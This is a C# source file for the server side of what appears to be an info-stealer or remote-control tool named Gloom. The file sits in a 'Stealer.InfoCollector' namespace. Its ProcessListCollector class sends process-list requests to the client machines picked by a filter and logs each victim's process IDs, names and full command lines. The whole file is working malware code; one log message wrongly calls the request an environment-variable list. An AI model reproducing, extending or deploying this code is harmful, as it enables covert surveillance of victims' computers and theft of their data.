using Serilog;

namespace Gloom.Server.Features.Stealer.InfoCollector;
internal class ProcessListCollector : FeatureBase
{
	public override Guid[] AcceptedOps => new Guid[] { OpCodes.ProcessListResponse };

	public ProcessListCollector(IMessageSender sender) : base(sender, "pslist")
	{

	}

	public override async Task HandleAsync(string from, Guid op, byte[] data)
	{
		OpStructs.ProcessListResponse str = StructConvert.Bytes2Struct<OpStructs.ProcessListResponse>(data);
		foreach (OpStructs.ProcessEntry entry in str.List)
			Log.Information("[Process of {client}] PID {pid}, Name {name}, CmdLine {cmdline}", from, entry.Pid, entry.Name, entry.CommandLine);
	}

	public override async Task<bool> HandleCommandAsync(string[] args)
	{
		if (args.Length == 0)
			return false;
		var filter = Filter.Parse(args[0]);
		var count = await SendAsync(filter, OpCodes.ProcessListRequest, new OpStructs.ProcessListRequest(), true);
		Log.Information("Sent environment variable list request to total {count} clients.", count);
		return true;
	}
}
